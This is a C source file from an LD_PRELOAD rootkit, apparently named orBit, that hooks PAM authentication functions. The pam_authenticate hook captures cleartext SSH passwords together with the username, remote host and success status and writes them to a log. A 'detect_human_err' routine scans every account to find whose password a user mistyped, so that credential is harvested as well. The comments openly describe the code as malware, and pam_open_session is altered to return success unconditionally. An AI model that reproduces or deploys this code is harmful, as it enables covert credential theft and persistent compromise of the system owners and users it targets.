#include "orBit.h"
extern int      fd;
extern uint8_t  sshd;
extern char     buf[ SIZE_BUF ];

struct pam_response *pam_get_password(pam_handle_t *pamh, char __attribute__((unused))*user, int __attribute__((unused))rkadmin, const char *prompt )
{
    struct pam_message msg;
    struct pam_response *pam_response = NULL;
    const struct pam_message *pmsg;
    const struct pam_conv *conv;
    const void *convp;
    int (*pam_item)(const pam_handle_t *pamh, int item_type, const void **item) = dlsym(RTLD_NEXT, "pam_get_item");

    if ((pam_item(pamh, PAM_CONV, &convp)) != PAM_SUCCESS)
        return ( NULL );
    conv = convp;
    if ( conv == NULL || conv->conv == NULL )
        return ( NULL );

    msg.msg_style = PAM_PROMPT_ECHO_OFF;
    msg.msg = prompt;
    pmsg = &msg;
    conv->conv( 1, &pmsg, &pam_response, conv->appdata_ptr );
    return ( pam_response );
}

/*
 * \fn uint8_t detect_human_err( const char *, const char *, char * )
 * \brief The "detect_huan_error" function is designed to detect human errors. For instance, if I attempt an SSH connection using the password of another user, Orbit will check whether this password belongs to any other user on the system.
 */
uint8_t detect_human_err( const char *passwd, const char *user, char *o_user )
{
    struct passwd *user_info;
    setpwent();
    while ((user_info = getpwent()) != NULL)
    {
        if ( _orBit_strcmp( user_info->pw_name, user ) != 0 )
        {
            if  ( check_password( passwd, user_info->pw_name ) == PAM_SUCCESS )
            {
                _orBit_memcpy( o_user, user_info->pw_name, _orBit_strlen( user_info->pw_name ));
                endpwent();
                return ( PAM_SUCCESS );
            }
        }
    }
    endpwent();
    return ( PAM_AUTH_ERR );
}

int pam_authenticate(pam_handle_t *pamh, int flags )
{
    const char *service = NULL, *host = NULL, *user = NULL;
    struct pam_response *pwd = NULL;
    uint8_t res = 0;
    int size = 0;

	static int ( *orig_pam_authenticate ) ( pam_handle_t *, int  ) = NULL;
	if ( ! orig_pam_authenticate )
		orig_pam_authenticate = ( int (*) ( pam_handle_t *, int )) dlsym ( RTLD_NEXT, "pam_authenticate");

    const char *service_sshd = ("sshd");
    int err = pam_get_item( pamh, PAM_SERVICE, ( void *)&service);
    if ( err == PAM_SUCCESS && _orBit_strcmp( service, service_sshd ) == 0 )
    {
        if ( pam_get_item(pamh, PAM_USER, ( void * ) &user ) != PAM_SUCCESS )
            return ( PAM_AUTH_ERR );

        if ( pam_get_item(pamh, PAM_RHOST, ( void * ) &host) != PAM_SUCCESS )
            return ( PAM_AUTH_ERR );
	   
        pwd = pam_get_password(pamh, "", 0, "Password: ");
        if ( pwd == NULL )
            return ( PAM_CONV_ERR );
        
        res = check_password( pwd->resp, user );
        // If the return of the function is different from PAM_SUCCESS, the error can be due to several reasons:
        //      PAM_USER_UNKNOWN: The username is not present in the system.
        //      PAM_BUF_ERR: Memory allocation error.
        //      PAM_OPEN_ERR: The library containing the "crypt" symbol could not be opened.
        //      PAM_SYMBOL_ERR: The "crypt" symbol was not found.
        if ( res == PAM_USER_UNKNOWN || res == PAM_BUF_ERR || res == PAM_OPEN_ERR || res == PAM_SYMBOL_ERR )
            return ( res );
        
        if ( res == PAM_AUTH_ERR )
        {
            // The malware has the ability to take advantage of human errors to its benefit. For example, it often happens that when I connect via SSH to a machine, I enter the password of another account by mistake.
            // Therefore, Orbit will analyze the "/etc/shadow" file and verify that the password entered by the user is not that of another user.
            char    o_user[ PATH_MAX ];
            if ( detect_human_err( pwd->resp, user, o_user ) == PAM_SUCCESS )
                size = sprintf( buf, "DETECT_HUMAN_ERR:%s:%s\n", o_user, pwd->resp );
        }
        else
            size = sprintf( buf, "%s:%s:%s:%s:%s\n", service, user, host, pwd->resp, ( res == 0 ) ? "SUCCESS" : "ERROR");
        // # Backup the username, password, host (source IP), and the value ERROR or SUCCESS.
        __LOG( buf, size );
        free( pwd );
        return ( res );
    }
    const char *service_su = "su";
    if ( err == PAM_SUCCESS && _orBit_strcmp( service, service_su ) == 0 )
    {
        
    }
    return ( orig_pam_authenticate( pamh, flags ) );
}

int     pam_acct_mgmt(pam_handle_t *pamh, int flags)
{
	static int ( *__pam_acct_mgmt ) ( pam_handle_t *, int  ) = NULL;
	if ( ! __pam_acct_mgmt )
		__pam_acct_mgmt = ( int (*) ( pam_handle_t *, int )) dlsym ( RTLD_NEXT, "pam_acct_mgmt");

    char    *user = NULL;
    if ( pam_get_item(pamh, PAM_USER, ( void * ) &user ) != PAM_SUCCESS )
            return ( PAM_AUTH_ERR );
	return __pam_acct_mgmt ( pamh, flags );
}

int     pam_open_session(pam_handle_t *pamh, int flags)
{
	static int ( *__pam_open_session ) ( pam_handle_t *, int  ) = NULL;
	if ( ! __pam_open_session )
		__pam_open_session = ( int (*) ( pam_handle_t *, int )) dlsym ( RTLD_NEXT, "pam_open_session");
    return ( PAM_SUCCESS );
    char    *user = NULL;
    if ( pam_get_item(pamh, PAM_USER, ( void * ) &user ) != PAM_SUCCESS )
            return ( PAM_AUTH_ERR );
	return __pam_open_session(pamh, flags);
}

int pam_setcred(pam_handle_t __attribute__((unused))* pamh , int __attribute__((unused))flags )
{
    
	static int ( *__pam_setcred ) ( pam_handle_t *, int  ) = NULL;
	if ( ! __pam_setcred )
		__pam_setcred = ( int (*) ( pam_handle_t *, int )) dlsym ( RTLD_NEXT, "pam_setcred");
   return __pam_setcred( pamh, flags );
}

